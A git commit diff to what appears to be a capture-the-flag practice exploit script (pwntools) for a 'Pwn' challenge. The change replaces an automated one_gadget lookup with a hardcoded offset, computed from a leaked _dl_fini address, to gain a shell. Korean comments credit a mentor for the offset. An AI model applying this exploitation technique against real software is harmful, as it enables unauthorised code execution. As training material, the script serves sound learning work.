222713a44132e6305b0fa4132c24a47f28c3cdb1
Faper <43310141+Seo-Faper@users.noreply.github.com>
2024-08-03 19:15:06 +0000

    dd

--- 03 Pwn/prob10/prob10.py
+++ 03 Pwn/prob10/prob10.py
@@ -1,9 +1,4 @@
 from pwn import *
-import subprocess
-context.terminal=['tmux', 'splitw', '-h']
-def get_one_gadgets():
-  return [int(i) for i in subprocess.check_output(['one_gadget', '--raw', './libc.so.6']).decode().split(' ')]
-
 
 #p = remote('fsi.zzado.kr', 9940)
 p = process('./prob10')
@@ -21,10 +16,9 @@ dl_fini = p.recv().split(b' ')
 dl_fini = int(dl_fini[4][:-3], 16)
 log.info(f'dl_fini : {hex(dl_fini)}')
 
-libc_base = dl_fini - 0x237040
+libc_base = dl_fini - 0x237040 #멘토님께서 구한 차이값으로 계산
 
-ogt_offset = get_one_gadgets()
-one_gadget = libc_base + ogt_offset[0] # 실패 시 ogt_offset[1] 같은 다음 인덱스로 바꿔보셈 
+one_gadget = libc_base + 0xebc81
 log.info(f'libc_base : {hex(libc_base)}')
 log.info(f'one_gadget : {hex(one_gadget)}')
 
